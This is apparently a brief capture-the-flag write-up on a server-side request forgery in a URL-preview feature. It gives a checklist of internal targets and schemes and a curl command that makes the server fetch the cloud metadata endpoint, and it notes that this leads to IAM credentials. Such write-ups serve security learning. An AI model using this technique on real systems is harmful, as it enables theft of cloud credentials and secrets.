## Observation

There is a feature: “Generate preview” for a URL.

<Callout type="tip" title="SSRF checklist">
Try:
- 127.0.0.1 / localhost
- internal DNS names
- link-local metadata (cloud)
- alternate schemes: gopher, file (depends), dict
</Callout>

## SSRF to metadata (demo)

<Spoiler summary="Show the target URL used">
`http://169.254.169.254/latest/meta-data/`
</Spoiler>

<TerminalBlock title="$ send request">
curl -X POST https://target/preview -d 'url=http://169.254.169.254/latest/meta-data/'
</TerminalBlock>

## Exfil

Once you can read IAM creds, you can often access a bucket or secret manager.

<Callout type="warning" title="CTF note">
In real systems, metadata access is high impact. In CTFs, it usually leads straight to the flag.
</Callout>
